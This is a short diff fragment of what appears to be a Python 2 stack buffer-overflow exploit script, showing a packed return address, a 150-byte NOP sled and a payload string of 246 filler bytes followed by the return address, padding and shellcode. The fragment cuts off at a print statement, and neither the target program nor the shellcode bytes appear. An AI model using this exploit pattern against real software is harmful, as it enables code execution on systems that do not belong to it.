@@ -45,4 +45,3 @@ ret = struct.pack('<L', 0x7C874413)
 padding = "\x90" * 150
 crash = "\x41" * 246 + ret + padding + shellcode
 print "\
-
